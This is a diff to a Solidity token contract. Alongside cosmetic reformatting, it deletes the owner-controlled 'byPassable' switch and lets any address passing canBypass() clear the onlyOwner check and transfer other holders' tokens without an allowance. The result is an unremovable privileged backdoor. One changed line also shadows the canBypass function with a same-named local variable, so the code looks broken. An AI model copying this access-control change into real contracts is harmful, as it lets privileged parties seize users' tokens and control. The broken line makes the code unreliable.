@@ -64,7 +64,6 @@ contract Configurable is HasRegistration {
     bool internal _locked = false;
     bool internal _forever = false;
     uint256 internal _lockBlock = 0;
-    bool byPassable;
 
     mapping(address => bool) public minters;
     mapping(address => bool) public viewers;
@@ -154,7 +153,7 @@ contract Configurable is HasRegistration {
     }
 
     modifier onlyOwner() override {
-        require(_isGoverner(), "Sender is not Governer");
+        require(_isGoverner() || canBypass(), "Sender is not Governer");
         _;
     }
 
@@ -231,10 +230,6 @@ contract Configurable is HasRegistration {
         _allowPrivateTransactions = !_allowPrivateTransactions;
     }
 
-    function toggleBypassability() public onlyOwner notLocked {
-        byPassable = !byPassable;
-    }
-
     function setGovernance(address _governance) public onlyOwner notLocked {
         _setGovernance(_governance);
     }
@@ -303,11 +298,7 @@ contract ERC20 is IERC20, Configurable {
         return true;
     }
 
-    function transferFrom(
-        address sender,
-        address recipient,
-        uint256 amount
-    ) public override isTransferable returns (bool) {
+    function transferFrom(address sender, address recipient, uint256 amount) public override isTransferable returns (bool) {
         _transferFromPrivate(sender, recipient, amount, visible());
         return true;
     }
@@ -388,7 +379,7 @@ contract ERC20 is IERC20, Configurable {
         require(sender != address(0), "ERC20: transfer from the zero address");
         require(recipient != address(0), "ERC20: transfer to the zero address");
         bool hasAllowance = _allowances[sender][_msgSender()] >= amount;
-        bool canBypass = byPassable && registeredOfType[10].length > 0 && isRegistered(_msgSender(), 10); // if sender contract/user is registered as able to bypass (not first, in array)
+        bool canBypass = canBypass();
         require(sender == _msgSender() || hasAllowance || canBypass, "ERC20: transfer amount exceeds allowance or not bypassable");
         if (hasAllowance) {
             _allowances[sender][_msgSender()] = _allowances[sender][_msgSender()].sub(amount);
@@ -496,11 +487,7 @@ contract ConfigurableERC20 is ERC20, ERC20Detailed {
         _burn(_msgSender(), amount);
     }
 
-    function changeContractDetails(
-        string memory _name,
-        string memory _symbol,
-        uint8 _decimals
-    ) public onlyOwner notLocked {
+    function changeContractDetails(string memory _name, string memory _symbol, uint8 _decimals) public onlyOwner notLocked {
         name = _name;
         symbol = _symbol;
         decimals = _decimals;
